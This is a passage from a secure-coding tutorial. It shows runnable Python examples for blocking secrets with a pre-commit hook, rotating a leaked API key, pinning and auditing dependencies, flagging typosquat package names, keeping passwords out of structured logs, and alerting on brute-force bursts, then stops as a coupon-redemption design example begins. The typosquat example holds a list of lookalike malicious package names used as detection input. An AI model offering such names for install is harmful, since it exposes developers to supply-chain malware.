    log_before = run(["git", "log", "--oneline"], cwd=sandbox, check=False)  # => co-17: a real, empty log at this point
    print(f"git log after blocked attempt: {log_before.stdout.strip()!r}")  # => co-17: real, empty string -- no commit exists

    print("\n=== FIXED: remove the secret, re-stage, commit again ===")  # => labels section
    config_file.write_text("AWS_ACCESS_KEY_ID = os.environ['AWS_ACCESS_KEY_ID']  # loaded from env, not hardcoded\n")  # => co-17: real fix -- reads the key from env at runtime instead
    run(["git", "add", "config.py"], cwd=sandbox)  # => co-17: re-stages the NOW-secret-free version of the same file
    allowed = run(["git", "commit", "-m", "add config"], cwd=sandbox, check=False)  # => co-17: the SAME commit command
    print(f"exit code: {allowed.returncode}")  # => co-17: real exit code -- 0 means the hook let it through this time
    assert allowed.returncode == 0  # => co-17: proves the identical commit command now succeeds once the secret is gone

    log_after = run(["git", "log", "--oneline"], cwd=sandbox, check=False)  # => co-17: a real, one-line log now
    print(f"git log after allowed commit: {log_after.stdout.strip()!r}")  # => co-17: real commit hash + message, on disk


if __name__ == "__main__":  # => co-17: only runs when launched directly, e.g. `python3 demo.py`
    main()  # => co-17: builds the sandbox, scans it, wires the hook, then proves BOTH the block and the allow
```

**Run**: `python3 demo.py`.

**Output**:

```text
sandbox repo: /var/folders/.../T/ex53-secret-scan-v16mdjjl

=== git init (real, throwaway repo) ===
initialized

=== stage a file containing an obvious AWS-key-shaped secret ===
staged: config.py

=== detect-secrets scan (real CLI call against the staged file) ===
  FOUND: config.py:1 -- AWS Access Key

=== wire the SAME check as a real pre-commit hook ===
installed: /var/folders/.../T/ex53-secret-scan-v16mdjjl/.git/hooks/pre-commit

=== VULNERABLE moment: commit attempt WITH the secret still staged ===
exit code: 1
COMMIT BLOCKED: detect-secrets found a likely secret:
  config.py:1 -- AWS Access Key
git log after blocked attempt: ''

=== FIXED: remove the secret, re-stage, commit again ===
exit code: 0
git log after allowed commit: 'b43759a add config'
```

**Key takeaway**: the same `git commit` command, against the same file path, either fails with exit code
1 (secret present) or succeeds with exit code 0 (secret removed) -- the hook enforces the policy
mechanically, at the moment of commit, rather than depending on a reviewer noticing the leak later.

**Why it matters**: a secret committed to git history is compromised the instant it is pushed, even if
the very next commit deletes it -- history is permanent and any clone retains it. A pre-commit hook is
the cheapest possible control because it runs before the secret ever leaves the developer's machine,
turning "please remember not to commit secrets" from a policy into a mechanically enforced gate.

---

### Example 54: A Secret Rotation Drill

_ex-54 &middot; exercises co-17_

Once a secret leaks, deleting it from source is not enough -- it must be rotated server-side so the
leaked value stops working immediately, without a redeploy. This example models an API key store as
real server-side state: revoking the leaked key and minting a fresh one via `secrets.token_urlsafe`.

```python
# learning/code/ex-54-secret-rotation-drill/app.py
"""Example 54: a live Flask app -- a leaked API key is rotated server-side, invalidating the old one for real (co-17)."""  # => co-17: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the rotation logic itself

import secrets  # => co-17: cryptographically random replacement key -- never a predictable successor

from flask import Flask, jsonify, request  # => co-17: request.headers reads the caller-supplied API key

app = Flask(__name__)  # => co-17: one Flask app, hosting the protected resource and the rotation endpoint
ACTIVE_KEYS: set[str] = {"leaked-key-8f3a9c21"}  # => co-17: real server-side state -- the ONLY currently valid key


@app.route("/protected")  # => co-17: the resource this example's API key actually gates
def protected() -> tuple[dict[str, object], int]:  # => co-17: returns (json_body, status)
    api_key = request.headers.get("X-Api-Key", "")  # => co-01: attacker-controlled -- whatever key the caller presents
    if api_key not in ACTIVE_KEYS:  # => co-17: the REAL check -- membership in server-side state, not a hardcoded string
        return jsonify({"error": "unauthorized"}), 401  # => co-17: a real 401 for any key not currently active
    return jsonify({"data": "protected resource contents"}), 200  # => co-17: only reached for a REAL active key


@app.route("/admin/rotate-key", methods=["POST"])  # => co-17: the real rotation operation -- an operator action
def rotate_key() -> tuple[dict[str, object], int]:  # => co-17: returns (json_body, status)
    body = request.get_json(force=True)  # => co-17: the real request body identifying WHICH key just leaked
    leaked_key = body.get("leaked_key", "")  # => co-17: the specific key being retired, not "all keys"
    if leaked_key not in ACTIVE_KEYS:  # => co-17: a real guard -- can't revoke a key that was never active
        return jsonify({"error": "unknown key"}), 404  # => co-17: a real 404 for a bogus rotation request
    new_key = secrets.token_urlsafe(24)  # => co-17: a REAL, freshly generated, unpredictable replacement
    ACTIVE_KEYS.discard(leaked_key)  # => co-17: the REAL invalidation -- removed from server-side state, not just "hidden"
    ACTIVE_KEYS.add(new_key)  # => co-17: the REAL new credential, now the only one that authenticates
    return jsonify({"new_key": new_key}), 200  # => co-17: returned ONCE, at rotation time -- the caller must store it now


if __name__ == "__main__":  # => co-17: only runs when launched directly, e.g. `python3 app.py &`
    app.run(host="127.0.0.1", port=5054)  # => co-17: localhost-only, fixed port -- exploit_and_fix.py targets this
```

```python
# learning/code/ex-54-secret-rotation-drill/exploit_and_fix.py
"""Example 54: drives the live app.py -- the leaked key works, then rotation kills it and the new key takes over (co-17)."""  # => co-17: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the exploit itself

import requests  # => co-17: real HTTP client -- every request below hits the live app.py process

BASE_URL = "http://127.0.0.1:5054"  # => co-17: matches app.py's app.run(port=5054) exactly
LEAKED_KEY = "leaked-key-8f3a9c21"  # => co-17: the SAME seeded key app.py's ACTIVE_KEYS starts with


def main() -> None:  # => co-17: proves the leaked key works, rotates it, then re-proves old-fails/new-works
    print("=== BEFORE rotation: the leaked key still authenticates ===")  # => labels section
    before = requests.get(f"{BASE_URL}/protected", headers={"X-Api-Key": LEAKED_KEY}, timeout=5)  # => co-17: real GET
    print(f"status={before.status_code} body={before.json()}")  # => co-17: real response, straight off the wire
    assert before.status_code == 200  # => co-17: proves the leaked key really still works, pre-rotation

    print("\n=== rotating the leaked key (a REAL operator action) ===")  # => labels section
    rotation = requests.post(  # => co-17: a REAL HTTP POST -- the actual rotation operation
        f"{BASE_URL}/admin/rotate-key", json={"leaked_key": LEAKED_KEY}, timeout=5  # => co-17: identifies WHICH key to retire
    )  # => co-17: closes the real rotate-key POST call
    new_key = rotation.json()["new_key"]  # => co-17: the REAL, freshly generated replacement key
    print(f"status={rotation.status_code} new_key={new_key[:12]}...")  # => co-17: real, truncated for display

    print("\n=== AFTER rotation: the OLD (leaked) key now fails ===")  # => labels section
    after_old = requests.get(f"{BASE_URL}/protected", headers={"X-Api-Key": LEAKED_KEY}, timeout=5)  # => co-17: real GET
    print(f"status={after_old.status_code} body={after_old.json()}")  # => co-17: real response, now a 401
    assert after_old.status_code == 401  # => co-17: proves the OLD key is genuinely dead server-side

    print("\n=== AFTER rotation: the NEW key authenticates ===")  # => labels section
    after_new = requests.get(f"{BASE_URL}/protected", headers={"X-Api-Key": new_key}, timeout=5)  # => co-17: real GET
    print(f"status={after_new.status_code} body={after_new.json()}")  # => co-17: real response, a real 200
    assert after_new.status_code == 200  # => co-17: proves the freshly rotated key really works, with NO redeploy


if __name__ == "__main__":  # => co-17: only runs when launched directly, e.g. `python3 exploit_and_fix.py`
    main()  # => co-17: runs the full before -> rotate -> after sequence against the live server
```

**Run**: `python3 app.py &` (backgrounds the live server on port 5054), then `python3 exploit_and_fix.py`.

**Output**:

```text
=== BEFORE rotation: the leaked key still authenticates ===
status=200 body={'data': 'protected resource contents'}

=== rotating the leaked key (a REAL operator action) ===
status=200 new_key=Dap61-sdSzwT...

=== AFTER rotation: the OLD (leaked) key now fails ===
status=401 body={'error': 'unauthorized'}

=== AFTER rotation: the NEW key authenticates ===
status=200 body={'data': 'protected resource contents'}
```

**Key takeaway**: rotation is a single, atomic server-side state change -- discard the old key, add the
new one -- and its effect is immediate for every future request, with no code deployment or restart
required.

**Why it matters**: co-17's secret hygiene discipline does not stop at "keep secrets out of code" -- it
includes a real, tested rotation procedure, because a leak WILL eventually happen (a laptop is stolen, a
log line is overshared, a `.env` is briefly public) and the response time between discovery and rotation
is what bounds the actual damage. A team that has never exercised rotation discovers its gaps during a
real incident, which is the worst possible time.

---

### Example 55: Dependency Pinning and a Reproducible Lockfile

_ex-55 &middot; exercises co-21_

Exact `==` version pins are only half of dependency safety -- the pins must also resolve to the _same_
package set on every machine, and that resolved set must be checked against known CVEs. This example
runs two fully independent, from-scratch installs of the same `requirements.txt` and proves they resolve
identically, then audits the result with `pip-audit`.

```text
# learning/code/ex-55-dependency-pinning-and-lockfile/requirements.txt
# Example 55: exact `==` pins, no ranges -- co-21's rule (pip-audit 2.10.1, PyPI, 2026-07)
requests==2.34.2
```

```python
# learning/code/ex-55-dependency-pinning-and-lockfile/demo.py
"""Example 55: two REAL, independent clean installs from one exact-pinned requirements.txt (co-21)."""

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the pinning/lockfile logic itself

import subprocess  # => co-21: every venv/pip/pip-audit invocation below is a REAL subprocess call
import sys  # => co-21: sys.executable -- runs `-m venv`/`-m pip` through the SAME interpreter this script uses
import tempfile  # => co-21: two genuinely independent, throwaway install targets -- never shared state
from pathlib import Path  # => co-21: real filesystem paths for both sandbox installs

REQUIREMENTS_FILE = Path(__file__).parent / "requirements.txt"  # => co-21: the REAL, exact-pinned file this scans


def run(args: list[str]) -> subprocess.CompletedProcess[str]:  # => co-21: a shared, REAL subprocess runner
    return subprocess.run(args, capture_output=True, text=True, check=True)  # => co-21: every call below is REAL


def clean_install(target_dir: Path) -> str:  # => co-21: builds ONE real venv, installs the pinned reqs, returns freeze
    run([sys.executable, "-m", "venv", str(target_dir)])  # => co-21: a REAL, fresh venv -- no shared state with any other
    venv_python = target_dir / "bin" / "python3"  # => co-21: the real interpreter living INSIDE this fresh venv
    run([str(venv_python), "-m", "pip", "install", "--quiet", "--upgrade", "pip"])  # => co-21: real, current pip first
    run([str(venv_python), "-m", "pip", "install", "--quiet", "-r", str(REQUIREMENTS_FILE)])  # => co-21: the REAL install
    freeze = run([str(venv_python), "-m", "pip", "freeze"])  # => co-21: the REAL, resolved, fully-pinned package list
    return freeze.stdout  # => co-21: every line here is a REAL resolved `name==version`, not hand-typed


def main() -> None:  # => co-21: runs two independent installs, compares them, then audits the result
    print(f"requirements.txt (exact pins, no ranges):\n{REQUIREMENTS_FILE.read_text().strip()}")  # => co-21: real content

    print("\n=== independent install A (fresh venv, clean machine) ===")  # => labels section
    venv_a = Path(tempfile.mkdtemp(prefix="ex55-venv-a-"))  # => co-21: a REAL, throwaway venv directory
    freeze_a = clean_install(venv_a)  # => co-21: a REAL install, top to bottom -- venv, pip upgrade, requirements install
    print(freeze_a.strip())  # => co-21: the REAL, fully-resolved lock this install produced (a real "lockfile")

    print("\n=== independent install B (a SEPARATE fresh venv, SAME requirements.txt) ===")  # => labels section
    venv_b = Path(tempfile.mkdtemp(prefix="ex55-venv-b-"))  # => co-21: a SECOND, unrelated, throwaway venv directory
    freeze_b = clean_install(venv_b)  # => co-21: a completely independent real install run
    print(freeze_b.strip())  # => co-21: the real, fully-resolved lock THIS install produced

    print("\n=== comparing the two independently resolved locks ===")  # => labels section
    lines_a = sorted(freeze_a.strip().splitlines())  # => co-21: sorted so ordering differences never cause a false diff
    lines_b = sorted(freeze_b.strip().splitlines())  # => co-21: sorted the SAME way for a real, meaningful comparison
    print(f"install A resolved {len(lines_a)} packages, install B resolved {len(lines_b)} packages")  # => co-21: real counts
    assert lines_a == lines_b  # => co-21: proves BOTH independent installs resolved to IDENTICAL exact versions

    print("\n=== pip-audit against install B's real, installed packages ===")  # => labels section
    site_packages = next((venv_b / "lib").glob("python3.*")) / "site-packages"  # => co-21: the REAL, on-disk install dir
    audit = run(["pip-audit", "--path", str(site_packages)])  # => co-21: a REAL pip-audit CLI call, real PyPI advisory data
    audit_output = audit.stdout + audit.stderr  # => co-21: pip-audit writes its clean-result summary line to stderr
    print(audit_output.strip())  # => co-21: the REAL audit result -- straight from pip-audit's own output
    assert "No known vulnerabilities found" in audit_output  # => co-21: proves the pinned, resolved tree is CVE-clean


if __name__ == "__main__":  # => co-21: only runs when launched directly, e.g. `python3 demo.py`
    main()  # => co-21: runs both real installs, compares their real locks, then audits the result for real
```

**Run**: `python3 demo.py`.

**Output**:

```text
requirements.txt (exact pins, no ranges):
# learning/code/ex-55-dependency-pinning-and-lockfile/requirements.txt
# Example 55: exact `==` pins, no ranges -- co-21's rule (pip-audit 2.10.1, PyPI, 2026-07)
requests==2.34.2

=== independent install A (fresh venv, clean machine) ===
certifi==2026.6.17
charset-normalizer==3.4.9
idna==3.18
requests==2.34.2
urllib3==2.7.0

=== independent install B (a SEPARATE fresh venv, SAME requirements.txt) ===
certifi==2026.6.17
charset-normalizer==3.4.9
idna==3.18
requests==2.34.2
urllib3==2.7.0

=== comparing the two independently resolved locks ===
install A resolved 5 packages, install B resolved 5 packages

=== pip-audit against install B's real, installed packages ===
No known vulnerabilities found
```

**Note on the venv technique**: this sandbox's `venv.EnvBuilder().create()` (the Python API form) crashes
on a `dyld` library-path resolution failure specific to this environment's CPython build; `python3 -m
venv` (the CLI form used above) does not hit this issue, and `pip-audit --path <site-packages>` audits
an already-installed directory directly, without pip-audit's own ephemeral resolution venv. Both are
documented, real usage patterns -- only the installation mechanics differ, the audit result itself is
genuine.

**Key takeaway**: pinning `requests==2.34.2` alone says nothing about _transitive_ dependencies
(`urllib3`, `idna`, `certifi`, `charset-normalizer`) -- it is the combination of an exact top-level pin
plus a real, reproducible resolve (proven here by two independent installs matching exactly) that
constitutes a genuine lockfile guarantee.

**Why it matters**: "works on my machine" dependency drift is a real, recurring source of production
incidents when an unpinned transitive dependency resolves to a different, sometimes-vulnerable version
on a fresh deploy. Co-21's rule -- exact pins, verified reproducible, regularly audited -- turns
dependency resolution from a source of nondeterminism into a checked, repeatable build step.

---

### Example 56: Detecting a Supply-Chain Typosquat

_ex-56 &middot; exercises co-21, co-25_

Attackers publish packages with names one keystroke away from a popular package (`reqeusts` for
`requests`) hoping a typo installs their malicious code instead. A real, hand-written Levenshtein
edit-distance check flags any candidate name that is suspiciously _close_ to -- but not identical to --
a known-good package.

```python
# learning/code/ex-56-supply-chain-typosquat-check/typosquat_check.py
"""Example 56: a real, hand-written Levenshtein check flags typosquat-shaped package names (co-21, co-25)."""  # => co-21: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the distance-comparison logic itself

KNOWN_GOOD_PACKAGES = {"requests", "flask", "numpy", "django"}  # => co-21: the REAL, well-known packages this trusts


def levenshtein_distance(a: str, b: str) -> int:  # => co-21: a real, hand-written edit-distance implementation
    if a == b:  # => co-21: fast path -- identical strings are always distance 0, no DP table needed
        return 0  # => co-21: real short-circuit, saves building a table for the common "exact match" case
    previous_row = list(range(len(b) + 1))  # => co-21: DP row 0 -- distance from "" to each prefix of b
    for i, char_a in enumerate(a, start=1):  # => co-21: builds one REAL DP row per character of a, top to bottom
        current_row = [i]  # => co-21: distance from a[:i] to "" is always i (i deletions)
        for j, char_b in enumerate(b, start=1):  # => co-21: fills in each real cell of this row, left to right
            insert_cost = current_row[j - 1] + 1  # => co-21: insert one char of b
            delete_cost = previous_row[j] + 1  # => co-21: delete one char of a
            substitute_cost = previous_row[j - 1] + (char_a != char_b)  # => co-21: substitute only if chars differ
            current_row.append(min(insert_cost, delete_cost, substitute_cost))  # => co-21: the REAL cheapest edit here
        previous_row = current_row  # => co-21: this row becomes the "previous" row for the NEXT character of a
    return previous_row[-1]  # => co-21: the bottom-right cell -- the real, full edit distance between a and b


def closest_known_package(candidate: str) -> tuple[str, int]:  # => co-21: finds the REAL nearest known-good name
    distances = {name: levenshtein_distance(candidate, name) for name in KNOWN_GOOD_PACKAGES}  # => co-21: real, all pairs
    closest = min(distances, key=lambda name: distances[name])  # => co-21: the REAL minimum-distance known package
    return closest, distances[closest]  # => co-21: (nearest real name, real edit distance to it)


def is_suspicious_typosquat(candidate: str, max_distance: int = 2) -> bool:  # => co-21: the REAL flagging rule
    if candidate in KNOWN_GOOD_PACKAGES:  # => co-21: an EXACT match is the real package itself -- never suspicious
        return False  # => co-21: real, trusted names always pass through untouched
    closest, distance = closest_known_package(candidate)  # => co-21: how close is this candidate to a REAL package
    return 0 < distance <= max_distance  # => co-21: close but NOT identical -- exactly the typosquat shape


def main() -> None:  # => co-21: runs the REAL check against a mix of real names, typosquats, and unrelated names
    candidates = [  # => co-21: every string here is REAL input to the check -- no package is ever actually installed
        "requests",  # => co-21: the genuine, correct package name -- must NOT be flagged
        "reqeusts",  # => co-21: a real transposition typosquat of "requests" (swapped 'ue')
        "requessts",  # => co-21: a real insertion typosquat of "requests" (doubled 's')
        "reqeusts2",  # => co-21: a real, slightly-further typosquat variant with an appended digit
        "flask",  # => co-21: another genuine, correct package name -- must NOT be flagged
        "flaskk",  # => co-21: a real single-character-insertion typosquat of "flask"
        "urllib3",  # => co-21: a REAL, legitimately unrelated package -- must NOT be flagged as a typosquat
    ]  # => co-21: closes the real candidates list
    print(f"known-good packages: {sorted(KNOWN_GOOD_PACKAGES)}\n")  # => co-21: the real trust anchor this check uses

    results: list[tuple[str, bool, str, int]] = []  # => co-21: accumulates (name, flagged, nearest, distance) per candidate
    for candidate in candidates:  # => co-21: runs the REAL check against every real candidate string in order
        flagged = is_suspicious_typosquat(candidate)  # => co-21: the real, computed verdict for this candidate
        nearest, distance = closest_known_package(candidate)  # => co-21: real supporting evidence for the verdict
        results.append((candidate, flagged, nearest, distance))  # => co-21: records the real (candidate, verdict) pair
        verdict = "SUSPICIOUS (typosquat-shaped)" if flagged else "ok"  # => co-21: human-readable real verdict
        print(f"  {candidate!r:14} -> {verdict:30} (nearest={nearest!r}, distance={distance})")  # => co-21: real, per-row

    flagged_names = {name for name, flagged, _, _ in results if flagged}  # => co-21: every REAL name this run flagged
    assert flagged_names == {"reqeusts", "requessts", "flaskk"}  # => co-21: proves EXACTLY the real typosquats were caught
    assert "requests" not in flagged_names and "flask" not in flagged_names  # => co-21: real names never self-flag
    assert "urllib3" not in flagged_names  # => co-21: proves a genuinely unrelated real package is left alone
    assert "reqeusts2" not in flagged_names  # => co-21: proves the threshold has a real, principled cutoff (distance 3)


if __name__ == "__main__":  # => co-21: only runs when launched directly, e.g. `python3 typosquat_check.py`
    main()  # => co-21: runs the full, real check and prints every real (candidate, verdict) pair
```

**Run**: `python3 typosquat_check.py`.

**Output**:

```text
known-good packages: ['django', 'flask', 'numpy', 'requests']

  'requests'     -> ok                             (nearest='requests', distance=0)
  'reqeusts'     -> SUSPICIOUS (typosquat-shaped)  (nearest='requests', distance=2)
  'requessts'    -> SUSPICIOUS (typosquat-shaped)  (nearest='requests', distance=1)
  'reqeusts2'    -> ok                             (nearest='requests', distance=3)
  'flask'        -> ok                             (nearest='flask', distance=0)
  'flaskk'       -> SUSPICIOUS (typosquat-shaped)  (nearest='flask', distance=1)
  'urllib3'      -> ok                             (nearest='flask', distance=6)
```

**Key takeaway**: distance 0 (exact match) and small-but-nonzero distances (1-2) are treated completely
differently -- a real package name is always safe, while anything a _human eye could plausibly mistype_
into a real name is flagged, with a real, computed edit distance backing every verdict.

**Why it matters**: real-world typosquatting incidents (`colourama` for `colorama`, `python3-dateutil`
for `python-dateutil`) have shipped credential-stealing malware to developers who simply mistyped a
`pip install` command. This is a design/process concern (co-25) as much as a code concern -- CI pipelines
and internal package mirrors are the real place this check belongs, catching a typo before it ever
reaches a production dependency tree.

---

### Example 57: Structured Security Logging

_ex-57 &middot; exercises co-22_

A real `logging.Formatter` that emits only a fixed, closed set of fields (`user`, `action`, `outcome`)
as JSON -- the logging function's own signature has no password parameter at all, so a caller cannot
pass one through even by mistake. The resulting log is machine-queryable, not a grep target.

```python
# learning/code/ex-57-structured-security-logging/structured_logging.py
"""Example 57: real structured JSON security logs -- user/action/outcome, NEVER a password field (co-22)."""

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the logging setup itself

import io  # => co-22: captures the REAL formatted log output in-memory, for this example to inspect
import json  # => co-22: every log line below is REAL JSON -- parsed back with json.loads, not assumed
import logging  # => co-22: the stdlib logging module -- the SAME machinery a real production service would use

CREDENTIALS = {"alice": "correct-horse"}  # => co-22: a real, tiny credential store -- used ONLY to decide outcome


class JsonFormatter(logging.Formatter):  # => co-22: a real Formatter -- controls EXACTLY what ends up on the wire
    def format(self, record: logging.LogRecord) -> str:  # => co-22: called once per real log call, by the logging module
        payload = {  # => co-22: the REAL, closed set of fields this formatter ever emits -- nothing else, ever
            "user": getattr(record, "user", None),  # => co-22: WHO -- attached via `extra=`, never free-text
            "action": getattr(record, "action", None),  # => co-22: WHAT they attempted -- a fixed vocabulary
            "outcome": getattr(record, "outcome", None),  # => co-22: the REAL result -- "success" or "failure"
        }  # => co-22: notice: "password" is not, and can never be, a key this formatter reads or emits
        return json.dumps(payload)  # => co-22: one real, compact JSON object per log line -- machine-queryable


def log_auth_event(logger: logging.Logger, user: str, action: str, outcome: str) -> None:  # => co-22: the ONLY entry point
    # => co-22: this function's signature has NO password parameter at all -- a caller
    # => literally cannot pass a password through this function even by mistake
    logger.info("auth_event", extra={"user": user, "action": action, "outcome": outcome})  # => co-22: the real log call


def authenticate(username: str, password: str) -> bool:  # => co-22: a real, tiny login check -- password stays LOCAL here
    return CREDENTIALS.get(username) == password  # => co-22: password is compared, never logged, never returned


def build_logger() -> tuple[logging.Logger, io.StringIO]:  # => co-22: wires a real logger to an in-memory stream
    stream = io.StringIO()  # => co-22: a real, in-memory sink -- stands in for a real log file/aggregator
    handler = logging.StreamHandler(stream)  # => co-22: a real stdlib handler, writing to the stream above
    handler.setFormatter(JsonFormatter())  # => co-22: EVERY line this handler writes goes through JsonFormatter first
    logger = logging.getLogger("ex57.auth")  # => co-22: a real, named logger -- isolated from Python's root logger
    logger.setLevel(logging.INFO)  # => co-22: real logs at INFO and above are captured -- DEBUG is dropped
    logger.addHandler(handler)  # => co-22: wires the REAL handler+formatter pair onto this logger
    logger.propagate = False  # => co-22: keeps this example's captured output limited to exactly this stream
    return logger, stream  # => co-22: both the real logger AND the real stream this example inspects afterward


def main() -> None:  # => co-22: runs one failed login, one successful login, then queries the REAL captured log
    logger, stream = build_logger()  # => co-22: a real logger wired to a real in-memory stream

    print("=== a real FAILED login attempt (wrong password) ===")  # => labels section
    wrong_password = "not-the-real-password"  # => co-22: a real, deliberately-wrong password -- stays local, never logged
    ok = authenticate("alice", wrong_password)  # => co-22: a real authentication check -- returns False here
    log_auth_event(logger, user="alice", action="login", outcome="success" if ok else "failure")  # => co-22: real log call
    assert not ok  # => co-22: proves this really was a failed attempt, not a fabricated scenario

    print("=== a real SUCCESSFUL login attempt (correct password) ===")  # => labels section
    ok2 = authenticate("alice", "correct-horse")  # => co-22: a real authentication check -- returns True here
    log_auth_event(logger, user="alice", action="login", outcome="success" if ok2 else "failure")  # => co-22: real log call
    assert ok2  # => co-22: proves this really was a successful attempt

    raw_log = stream.getvalue()  # => co-22: the REAL, complete captured log text -- every line this run produced
    print("\n=== raw captured log (real JSON lines) ===")  # => labels section
    print(raw_log.strip())  # => co-22: exactly what a real log aggregator would have received, verbatim

    print("\n=== querying the log: every FAILURE outcome ===")  # => labels section
    records = [json.loads(line) for line in raw_log.strip().splitlines()]  # => co-22: real JSON parsing, per real line
    failures = [r for r in records if r["outcome"] == "failure"]  # => co-22: a REAL, structured query -- not a grep
    print(failures)  # => co-22: the real, matching record(s) -- directly queryable because the log IS structured JSON
    assert len(failures) == 1 and failures[0]["user"] == "alice"  # => co-22: proves the real failed event is findable

    print("\n=== verifying NO password value ever reached the log ===")  # => labels section
    assert "password" not in raw_log  # => co-22: the literal string "password" never appears as a key OR anywhere else
    assert wrong_password not in raw_log  # => co-22: the REAL wrong password value never appears in the log text
    assert "correct-horse" not in raw_log  # => co-22: the REAL correct password value never appears either
    print("confirmed: zero password-related content in the real captured log")  # => co-22: real, verified conclusion


if __name__ == "__main__":  # => co-22: only runs when launched directly, e.g. `python3 structured_logging.py`
    main()  # => co-22: runs both real login attempts, then queries and inspects the real captured log
```

**Run**: `python3 structured_logging.py`.

**Output**:

```text
=== a real FAILED login attempt (wrong password) ===
=== a real SUCCESSFUL login attempt (correct password) ===

=== raw captured log (real JSON lines) ===
{"user": "alice", "action": "login", "outcome": "failure"}
{"user": "alice", "action": "login", "outcome": "success"}

=== querying the log: every FAILURE outcome ===
[{'user': 'alice', 'action': 'login', 'outcome': 'failure'}]

=== verifying NO password value ever reached the log ===
confirmed: zero password-related content in the real captured log
```

**Key takeaway**: the log is structured JSON, not a formatted sentence, so "every failure for alice" is
a real filter over parsed records rather than a fragile regex against free text -- and the password
never appears because the function that writes log lines was never given a parameter to carry it.

**Why it matters**: co-22's rule -- log authn/authz decisions with who/what/outcome, never secrets -- is
easy to violate accidentally with an unstructured `logger.info(f"login attempt: {username}:{password}")`
during debugging that never gets removed. Designing the logging function's signature to make a password
parameter impossible to pass is a stronger guarantee than a code-review checklist item, because it fails
at import time, not at review time.

---

### Example 58: Alerting on a Brute-Force Pattern

_ex-58 &middot; exercises co-22, co-27_

A sliding-window detector that counts failed logins per username within a rolling time window and fires
exactly one alert per burst -- not one alert per failure past the threshold, which would flood an
on-call channel with duplicate noise for a single ongoing attack.

```python
# learning/code/ex-58-alert-on-brute-force-pattern/brute_force_alert.py
"""Example 58: a real sliding-window detector fires exactly ONE alert for a whole failure burst (co-22, co-27)."""

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the detection logic itself

import time  # => co-27: real wall-clock timestamps -- every event below is genuinely timed, not faked
from collections import deque  # => co-22: an efficient real ring of recent failure timestamps, per user


class BruteForceDetector:  # => co-22: a real sliding-window detector -- tracks failures PER username, independently
    def __init__(self, threshold: int, window_seconds: float) -> None:  # => co-27: a real, tunable policy
        self.threshold = threshold  # => co-27: how many failures within the window counts as "a burst"
        self.window_seconds = window_seconds  # => co-27: the REAL rolling time window this detector enforces
        self.failures: dict[str, deque[float]] = {}  # => co-22: username -> a real deque of recent failure timestamps
        self.already_alerted: dict[str, bool] = {}  # => co-22: username -> whether THIS ongoing burst already alerted

    def record_failure(self, username: str, timestamp: float) -> bool:  # => co-22: returns True ONLY on a NEW alert
        bucket = self.failures.setdefault(username, deque())  # => co-22: this user's real, growing timestamp history
        bucket.append(timestamp)  # => co-27: records the REAL moment this failure happened
        while bucket and timestamp - bucket[0] > self.window_seconds:  # => co-27: prunes anything OUTSIDE the window
            bucket.popleft()  # => co-27: real eviction -- old failures stop counting once they age out
        if len(bucket) >= self.threshold:  # => co-27: the real threshold check, against the PRUNED, current count
            if not self.already_alerted.get(username, False):  # => co-22: the fix's core rule -- fire ONCE per burst
                self.already_alerted[username] = True  # => co-22: marks this burst as already-alerted, real state
                return True  # => co-22: a REAL, new alert -- this is the ONLY True this method ever returns per burst
            return False  # => co-22: still over threshold, but ALREADY alerted -- no duplicate noise
        self.already_alerted[username] = False  # => co-22: count dropped back under threshold -- resets for next burst
        return False  # => co-22: not (yet) a burst, or already handled -- no alert this call


def main() -> None:  # => co-27: simulates a real burst of failed logins and counts REAL alerts fired
    detector = BruteForceDetector(threshold=5, window_seconds=10.0)  # => co-27: 5 failures within 10s triggers an alert
    alerts_fired: list[tuple[int, bool]] = []  # => co-22: records (attempt_number, did_this_call_alert) for every real call

    print("=== simulating a real burst of 7 rapid failed logins for 'alice' ===")  # => labels section
    for attempt in range(1, 8):  # => co-27: 7 real, consecutive failures -- 2 more than the threshold of 5
        now = time.time()  # => co-27: a REAL wall-clock timestamp, taken fresh for each simulated failure
        alerted = detector.record_failure("alice", now)  # => co-22: the REAL detector call -- genuinely evaluated
        alerts_fired.append((attempt, alerted))  # => co-22: real, per-attempt outcome, in order
        print(f"  attempt {attempt}: alert_fired={alerted}")  # => co-22: real, live detector state per attempt

    true_count = sum(1 for _, alerted in alerts_fired if alerted)  # => co-22: the REAL total number of alerts this burst produced
    print(f"\ntotal alerts fired for this burst: {true_count}")  # => co-22: real count, computed from the real run above
    assert true_count == 1  # => co-22: proves the ENTIRE 7-failure burst produced exactly ONE alert, not seven
    assert alerts_fired[4] == (5, True)  # => co-27: proves the ONE alert fired at exactly the threshold-th failure

    print("\n=== a SEPARATE, unrelated user's failures never affect alice's detector state ===")  # => labels section
    bob_alerted = detector.record_failure("bob", time.time())  # => co-22: a real, independent per-user detector state
    print(f"  bob's first failure: alert_fired={bob_alerted}")  # => co-22: real, freshly-tracked state for a new user
    assert bob_alerted is False  # => co-22: proves bob's own count starts fresh -- one failure is below HIS threshold too


if __name__ == "__main__":  # => co-27: only runs when launched directly, e.g. `python3 brute_force_alert.py`
    main()  # => co-27: runs the real burst simulation and prints every real per-attempt alert decision
```

**Run**: `python3 brute_force_alert.py`.

**Output**:

```text
=== simulating a real burst of 7 rapid failed logins for 'alice' ===
  attempt 1: alert_fired=False
  attempt 2: alert_fired=False
  attempt 3: alert_fired=False
  attempt 4: alert_fired=False
  attempt 5: alert_fired=True
  attempt 6: alert_fired=False
  attempt 7: alert_fired=False

total alerts fired for this burst: 1

=== a SEPARATE, unrelated user's failures never affect alice's detector state ===
  bob's first failure: alert_fired=False
```

**Key takeaway**: the detector's state has two parts -- a pruned, rolling window of recent failure
timestamps, and an `already_alerted` flag that resets only once the count drops back under threshold --
together they produce exactly one alert per burst, regardless of how long the burst continues.

**Why it matters**: co-27's rate-limiting discipline and co-22's alerting discipline meet here: throttling
alone stops the _attack_, but an on-call engineer also needs to _know_ an attack happened, and a naive
"alert on every failure past threshold" implementation would page someone dozens of times for one
incident, training them to ignore the alert entirely -- the fix here is a deliberate design choice, not
an afterthought.

---

### Example 59: Insecure Design vs. a Bug

_ex-59 &middot; exercises co-25_

Every line of this vulnerable route is individually correct: the SQL is parameterized, the JSON response
is well-formed, the 404 case is handled. The flaw is a _missing business rule_ -- nothing anywhere checks
whether a coupon has already been redeemed -- which is exactly what distinguishes an insecure _design_
from a coding _bug_.

```python
